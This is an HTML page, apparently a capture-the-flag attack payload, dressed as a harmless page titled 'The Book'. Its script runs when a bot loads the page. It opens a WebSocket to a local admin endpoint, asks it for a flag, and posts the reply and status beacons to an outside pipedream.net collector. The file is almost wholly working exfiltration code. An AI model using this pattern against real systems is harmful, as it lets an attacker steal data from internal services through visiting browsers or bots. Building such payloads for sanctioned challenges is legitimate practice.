<!DOCTYPE html>
<html lang="en">
<body>
    <h1>The Book</h1>
    <span>This is a book.</span>
    <script>
        fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Bot accessed HTML page" })
        });

        const ws = new WebSocket('ws://127.0.0.1:8080/admin/ws');

        fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "Bot accessed HTML page after socket" })
        });

        ws.onopen = () => {
            fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ message: "Opened?" })
             });
          console.log('WebSocket connection established!');
          ws.send('flag');
        };

        ws.onmessage = (event) => {
          const flag = event.data;

          fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ flag: flag })
          });
        
          ws.close();
        };

        ws.onerror = (error) => {
          fetch('https://eorokvtrcf7mllf.m.pipedream.net/', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: error })
          });
        };
    </script>
</body>
</html>
